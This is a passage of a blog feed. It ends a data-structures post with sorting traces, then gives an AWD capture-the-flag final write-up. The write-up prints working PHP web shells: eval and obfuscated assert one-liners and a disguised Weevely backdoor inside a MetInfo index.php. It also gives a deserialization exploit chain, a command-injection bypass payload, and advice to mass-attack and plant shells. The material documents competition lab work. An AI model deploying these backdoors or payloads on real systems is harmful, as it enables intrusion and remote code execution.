href="#1-插入排序" class="headerlink" title="(1)插入排序"></a>(1)插入排序</h3><p>待排序序列：60、43、29、56、48、72、57、30</p><p><img src="/images/qm/data_struct/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.png"></p><h3 id="2-起泡排序"><a href="#2-起泡排序" class="headerlink" title="(2)起泡排序"></a>(2)起泡排序</h3><table><thead><tr><th align="center">初始</th><th align="center">第一次</th><th align="center">第二次</th><th align="center">第三次</th><th align="center">第四次</th><th align="center">第五次</th><th align="center">第六次</th><th align="center">第七次</th></tr></thead><tbody><tr><td align="center">60</td><td align="center">43</td><td align="center">29</td><td align="center">29</td><td align="center">29</td><td align="center">29</td><td align="center">29</td><td align="center">29</td></tr><tr><td align="center">43</td><td align="center">29</td><td align="center">43</td><td align="center">43</td><td align="center">43</td><td align="center">43</td><td align="center">30</td><td align="center">30</td></tr><tr><td align="center">29</td><td align="center">56</td><td align="center">48</td><td align="center">48</td><td align="center">48</td><td align="center">30</td><td align="center">43</td><td align="center"></td></tr><tr><td align="center">56</td><td align="center">48</td><td align="center">56</td><td align="center">56</td><td align="center">30</td><td align="center">48</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">48</td><td align="center">60</td><td align="center">57</td><td align="center">30</td><td align="center">56</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">72</td><td align="center">57</td><td align="center">30</td><td align="center">57</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">57</td><td align="center">30</td><td align="center">60</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">30</td><td align="center">72</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="3-快速排序"><a href="#3-快速排序" class="headerlink" title="(3)快速排序"></a>(3)快速排序</h3><table><thead><tr><th align="center">初始状态</th><th align="center">{<span style="color:red;">60</span></th><th align="center">43</th><th align="center">29</th><th align="center">56</th><th align="center">48</th><th align="center">72</th><th align="center">57</th><th align="center">30}</th></tr></thead><tbody><tr><td align="center">第一次排序</td><td align="center">{30</td><td align="center">43</td><td align="center">29</td><td align="center">56</td><td align="center">48</td><td align="center">57}</td><td align="center"><span style="color:red;">60</span></td><td align="center">{72}</td></tr><tr><td align="center">第二次排序</td><td align="center">{29}</td><td align="center"><span style="color:red;">30</span></td><td align="center">{43</td><td align="center">56</td><td align="center">48</td><td align="center">57}</td><td align="center">60</td><td align="center">{72}</td></tr><tr><td align="center">第三次排序</td><td align="center">29</td><td align="center">30</td><td align="center">{<span style="color:red;">43</span></td><td align="center">56</td><td align="center">48</td><td align="center">57}</td><td align="center">60</td><td align="center">72</td></tr><tr><td align="center">第四次排序</td><td align="center">29</td><td align="center">30</td><td align="center">43</td><td align="center">48</td><td align="center"><span style="color:red;">56</span></td><td align="center">57</td><td align="center">60</td><td align="center">72</td></tr></tbody></table><h3 id="4-简单选择排序"><a href="#4-简单选择排序" class="headerlink" title="(4)简单选择排序"></a>(4)简单选择排序</h3><table><thead><tr><th align="center">初始关键字</th><th align="center">60</th><th align="center">43</th><th align="center">29</th><th align="center">56</th><th align="center">48</th><th align="center">72</th><th align="center">57</th><th align="center">30</th></tr></thead><tbody><tr><td align="center">一趟排序结果</td><td align="center">(29)</td><td align="center">43</td><td align="center">60</td><td align="center">56</td><td align="center">48</td><td align="center">72</td><td align="center">57</td><td align="center">30</td></tr><tr><td align="center">二趟排序结果</td><td align="center">(29</td><td align="center">30)</td><td align="center">60</td><td align="center">56</td><td align="center">48</td><td align="center">72</td><td align="center">57</td><td align="center">43</td></tr><tr><td align="center">三趟排序结果</td><td align="center">(29</td><td align="center">30</td><td align="center">43)</td><td align="center">56</td><td align="center">48</td><td align="center">72</td><td align="center">57</td><td align="center">60</td></tr><tr><td align="center">四趟排序结果</td><td align="center">(29</td><td align="center">30</td><td align="center">43</td><td align="center">48)</td><td align="center">56</td><td align="center">72</td><td align="center">57</td><td align="center">60</td></tr><tr><td align="center">五趟排序结果</td><td align="center">(29</td><td align="center">30</td><td align="center">43</td><td align="center">48</td><td align="center">56)</td><td align="center">72</td><td align="center">57</td><td align="center">60</td></tr><tr><td align="center">六趟排序结果</td><td align="center">(29</td><td align="center">30</td><td align="center">43</td><td align="center">48</td><td align="center">56</td><td align="center">57)</td><td align="center">72</td><td align="center">60</td></tr><tr><td align="center">七趟排序结果</td><td align="center">(29</td><td align="center">30</td><td align="center">43</td><td align="center">48</td><td align="center">56</td><td align="center">57</td><td align="center">60)</td><td align="center">72</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;第一次作业-熟悉C语言代码&quot;&gt;&lt;a href=&quot;#第一次作业-熟悉C语言代码&quot; class=&quot;headerlink&quot; title=&quot;第一次作业-熟悉C语言代码&quot;&gt;&lt;/a&gt;第一次作业-熟悉C语言代码&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;输出hello world&lt;/li&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>启明星辰杯决赛</title>
    <link href="http://blog.falsectf.top/2020/12/27/fe8aaca1.html"/>
    <id>http://blog.falsectf.top/2020/12/27/fe8aaca1.html</id>
    <published>2020-12-27T03:00:39.000Z</published>
    <updated>2020-12-31T13:03:00.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比赛环境："><a href="#比赛环境：" class="headerlink" title="比赛环境："></a>比赛环境：</h2><p>靶机环境：2套靶机</p><p>比赛时常：0.5+2.5，前30分钟加固阶段</p><p>赛题方向：WEB+PWN</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>D盾、Seay源代码审计系统、python、vscode、notepad++、SecureCRT 8.1</p><h2 id="加固阶段"><a href="#加固阶段" class="headerlink" title="加固阶段"></a>加固阶段</h2><p>分析：</p><p>​    绝大部分都是非root的低权用户，而且一般限制不会提权到root，所以操作有限</p><p>本次出现的问题：</p><p>​    漏洞文件删不掉。     解决方法：可以修改漏洞文件内容</p><p>​    网站根目录没找到，默认是/var/www/html    此次是/var/www/mac/   当时看到了mac目录，但是没在意，然后找了半天，思想固化了</p><p>​    找到了漏洞文件，但是不会利用          解决方法：平时多学多积累经验</p><h2 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h2><h3 id="WEB-漏洞1-一句话"><a href="#WEB-漏洞1-一句话" class="headerlink" title="WEB-漏洞1-一句话"></a>WEB-漏洞1-一句话</h3><p>文件位置: /var/www/mac/door.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>非常明显的一句话后门，利用方法有很多，可以写脚本打批量；也可以用蚁剑、菜刀等工具连接，都可以。</p><p>我在比赛中是利用这个后门基本打了全场的，几波过后有一半的队伍都修复了，导致后来少拿了很多分。</p><p>正确的利用思路：</p><ol><li>写脚本批量打全场</li><li>打全场的同时全场种🐎（我是在比赛开始4-5轮后才想起来的）</li><li>种马后将全场door.php删掉或改掉，用自己的🐎刷分</li></ol><h3 id="WEB-漏洞2-免杀一句话"><a href="#WEB-漏洞2-免杀一句话" class="headerlink" title="WEB-漏洞2-免杀一句话"></a>WEB-漏洞2-免杀一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; </span><br><span class="line"><span class="variable">$poc_1</span>=explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>); </span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; @<span class="variable">$poc_2</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#运行结果  assert($_POST[&#x27;_&#x27;]);</span></span><br></pre></td></tr></table></figure><p>可以看出同样也是一句话木马，只是将eval换成了assert，利用同上，但是好像不能用蚁剑之类的连接，记不清了</p><p>比赛时候用这个漏洞拿了很多分，基本door.php修了的队伍这个漏洞都没修复，也是打全场的漏洞</p><h3 id="WEB-漏洞3-反序列化"><a href="#WEB-漏洞3-反序列化" class="headerlink" title="WEB-漏洞3-反序列化"></a>WEB-漏洞3-反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getip</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;The ip is&#x27;</span>.<span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getresult</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ip = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ping</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$ip</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;ping &#x27;</span>.<span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">system(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现需要利用反序列化来触发漏洞，并且传入的字符串要经过base64编码</p><ol><li>首先实例化getip对象，然后修改构造方法，让ip属性去实例化getresult对象，因为下方会把它当作字符串执行，会触发tostring魔术方法</li><li>此时跳到了getresult类中，同样的，修改析构方法，实例化ping对象，因为在toString方法中调用了execute()方法</li><li>此时已经跳到了ping类中，只需要布置好system的参数就可以完成命令执行的目的了</li></ol><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getip</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ip=<span class="keyword">new</span> getresult() ; <span class="comment">//实例化getresult类，因为下方要把它当作字符串执行，用来调用魔术方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;The ip is&#x27;</span>.<span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getresult</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ip =<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> ping(); <span class="comment">//在下方的魔术方法中，调用了$this-&gt;obj-&gt;execute(); ，所以obj必须实例化ping类</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment">//被getip类的析构方法执行时调用</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ping</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$ip</span>=<span class="string">&#x27;;ls&#x27;</span>; <span class="comment">//完成命令执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;ping &#x27;</span>.<span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">system(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> getip();</span><br><span class="line">    <span class="comment">#$a-&gt;ip = new getresult();</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个漏洞比赛时候没有发现，也没有人用这个洞攻击我们，赛后看源码时候才发现的(错亿)，不然又是个打全场的洞。</p><h3 id="WEB-漏洞4-命令执行-bypass"><a href="#WEB-漏洞4-命令执行-bypass" class="headerlink" title="WEB-漏洞4-命令执行-bypass"></a>WEB-漏洞4-命令执行-bypass</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;address&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;address&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(filter_var(<span class="variable">$address</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                        <span class="variable">$filter_url</span> = parse_url(<span class="variable">$address</span>);</span><br><span class="line">                        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/127.0.0.1/&#x27;</span>,<span class="variable">$filter_url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                                system(<span class="string">&#x27;curl -v -s &#x27;</span>.<span class="variable">$filter_url</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$address = &quot;0aa://;ls;127.0.0.1&quot;;</span><br></pre></td></tr></table></figure><p>这个漏洞也是赛后发现的，同样没有人用这个洞攻击我们，不应该过于相信工具，算是一个小教训吧</p><p>还有就是这个洞目前我bypass只能执行ls命令，没法cat flag，如果师傅们会的话请师傅们教教我。</p><h3 id="WEB-漏洞5-Weevely后门"><a href="#WEB-漏洞5-Weevely后门" class="headerlink" title="WEB-漏洞5-Weevely后门"></a>WEB-漏洞5-Weevely后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&#x27;./config/install.lock&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&#x27;./install/index.php&#x27;</span>))&#123;</span><br><span class="line">header(<span class="string">&quot;location:./install/index.php&quot;</span>);<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;安装文件不存在，请上传安装文件。如已安装过，请新建config/install.lock文件。&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&#x27;M_NAME&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;M_MODULE&#x27;</span>, <span class="string">&#x27;web&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;M_CLASS&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;M_ACTION&#x27;</span>, <span class="string">&#x27;doindex&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./app/system/entrance.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array(&quot;/_/&quot;,2F&quot;2F/-/&quot;),array(&quot;/2F&quot;,&quot;2F+&quot;)2&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span> = <span class="string">&#x27;er&quot;2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;rpos(2F$p,$h)===0)2F&#123;$2Fs[$i]=2F&quot;&quot;;$p=2F$ss($p,3)2F2F2F;&#125;if(array2F_key_2Fexists($i,$s))2F&#123;2F$s&#x27;</span>;</span><br><span class="line"><span class="variable">$U</span> = <span class="string">&#x27;F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span> = <span class="string">&#x27;2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F)&#123;$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom&#x27;</span>;</span><br><span class="line"><span class="variable">$A</span> = str_replace(<span class="string">&#x27;Th&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;ThcreThThaThte_funThThction&#x27;</span>);</span><br><span class="line"><span class="variable">$N</span> = <span class="string">&#x27;m2F);if($2Fq&amp;&amp;$m)&#123;@ses2Fsion_2Fstar2Ft();$s=&amp;2F$_S2FESSION;$ss2F2F=&quot;substr&quot;;$sl2F=&quot;strt2F2Folow&#x27;</span>;</span><br><span class="line"><span class="variable">$q</span> = <span class="string">&#x27;&quot;2F&quot;;for($i=0;$i&lt;$2Fl;)2F&#123;2Ffor($j=0;($j&lt;$2Fc&amp;&amp;$i&lt;$l2F);$j+2F+,2F$i++)2F&#123;$o.=$t&#123;$i&#125;^2F$k&#123;$j2F&#125;;&#x27;</span>;</span><br><span class="line"><span class="variable">$K</span> = <span class="string">&#x27;=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll(&quot;/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/&quot;,$2Fra2F,$&#x27;</span>;</span><br><span class="line"><span class="variable">$F</span> = <span class="string">&#x27;_LANGUAGE2F&quot;];if($rr&amp;&amp;2F$r2F2Fa)&#123;$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F[&quot;query&quot;],$q2F)2F;$q&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;2F&#125;&#125;return $2Fo;2F&#125;$r=$_2FSE2FRVE2FR;$rr=@2F$r[&quot;2FHT2FTP_2FREFERER&quot;];$ra=@$r[2F&quot;HTTP_ACCE2F2FPT&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;$i.2F$kf)2F,0,3));$p=&quot;&quot;;for($z=2F1;$z&lt;coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st&#x27;</span>;</span><br><span class="line"><span class="variable">$X</span> = <span class="string">&#x27;$kh=&quot;abcd&quot;2F;$kf=&quot;2Feylg&quot;;f2Funct2Fion x($2Ft,$2Fk)&#123;$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print(&quot;&lt;2F$k&gt;2F$d&lt;/$k2F&gt;&quot;);@se2Fss2Fion_destroy();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$E</span> = str_replace(<span class="string">&#x27;2F&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$X</span> . <span class="variable">$q</span> . <span class="variable">$c</span> . <span class="variable">$F</span> . <span class="variable">$K</span> . <span class="variable">$N</span> . <span class="variable">$O</span> . <span class="variable">$d</span> . <span class="variable">$s</span> . <span class="variable">$l</span> . <span class="variable">$t</span> . <span class="variable">$U</span> . <span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$E</span>;</span><br><span class="line"><span class="variable">$I</span> = <span class="variable">$A</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$E</span>);</span><br><span class="line"><span class="variable">$I</span>();</span><br><span class="line">&#125;</span><br><span class="line">door();</span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个漏洞比赛时候发现了，不会利用，赛后也没会利用</p><p>是用kali下的Weevely工具生成的后门，还没有分析懂，等我研究明白了再把利用方法更新上…</p><p>参考链接：<a href="https://yaofeifly.github.io/2018/01/30/cyberearth/">https://yaofeifly.github.io/2018/01/30/cyberearth/</a></p><p><a href="https://www.freebuf.com/sectool/130560.html">https://www.freebuf.com/sectool/130560.html</a></p><p><a href="http://www.yqxiaojunjie.com/index.php/archives/256/">http://www.yqxiaojunjie.com/index.php/archives/256/</a></p><h3 id="WEB-漏洞6-file-put-content"><a href="#WEB-漏洞6-file-put-content" class="headerlink" title="WEB-漏洞6-file_put_content"></a>WEB-漏洞6-file_put_content</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>],php:<span class="comment">//input);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个….看起来非常像个漏洞，但是却有语法错误….也没复现成功…  不知道是不是一个漏洞</p><h2 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>比赛前夕忘记给队友的电脑安装python环境，导致无法和队友分工配合，我的锅</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>赛前准备了ssh改密码、命令执行脚本，但是因为来不及做测试了，导致比赛期间没有一个脚本可以使用</p><p>下次需要准备一个自动提交的脚本</p><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>给的不是root权限，是一个新建的用户，普通用户权限</p><h3 id="加固不熟"><a href="#加固不熟" class="headerlink" title="加固不熟"></a>加固不熟</h3><p>加固的一些操作不能只是停留在只是说说而已，应该多 实践</p><h3 id="一点点给自己的建议"><a href="#一点点给自己的建议" class="headerlink" title="一点点给自己的建议"></a>一点点给自己的建议</h3><p>学一学pwn</p><p><strong>不要总是停留在一句话后门，多去尝试更难的漏洞</strong></p><p><strong>实践实践实践！！！</strong></p><h2 id="合影留念"><a href="#合影留念" class="headerlink" title="合影留念"></a>合影留念</h2><p><img src="/images/AWD/2020-%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/3.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;比赛环境：&quot;&gt;&lt;a href=&quot;#比赛环境：&quot; class=&quot;headerlink&quot; title=&quot;比赛环境：&quot;&gt;&lt;/a&gt;比赛环境：&lt;/h2&gt;&lt;p&gt;靶机环境：2套靶机&lt;/p&gt;
&lt;p&gt;比赛时常：0.5+2.5，前30分钟加固阶段&lt;/p&gt;
&lt;p&gt;赛题方向：WEB+PW</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/categories/CTF/"/>
    
    
    <category term="AWD" scheme="http://blog.falsectf.top/tags/AWD/"/>
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP变量覆盖学习</title>
    <link href="http://blog.falsectf.top/2020/08/13/57c1f6bc.html"/>
    <id>http://blog.falsectf.top/2020/08/13/57c1f6bc.html</id>
    <published>2020-08-13T14:55:03.000Z</published>
    <updated>2021-01-02T01:18:01.579Z</updated>
    
